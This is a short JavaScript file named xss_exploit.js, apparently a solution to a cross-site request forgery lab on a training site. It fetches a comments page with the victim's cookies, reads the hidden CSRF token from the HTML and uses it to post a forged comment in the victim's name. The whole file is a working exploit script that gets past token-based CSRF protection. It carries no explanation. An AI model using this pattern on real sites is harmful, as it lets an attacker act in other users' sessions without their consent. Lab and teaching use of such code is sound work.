// xss_exploit.js
fetch('https://websec.ee/csrf/comments_token.php', {
    credentials: 'include'
})
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const token = doc.querySelector('input[name="csrf_token"]').value;

        const comment = 'Espresso Macchiato';

        const formData = new FormData();
        formData.append('comment', comment);
        formData.append('csrf_token', token);
        formData.append('submit', 'Add');

        fetch('https://websec.ee/csrf/comments_token.php', {
            method: 'POST',
            credentials: 'include',
            body: formData
        });
    });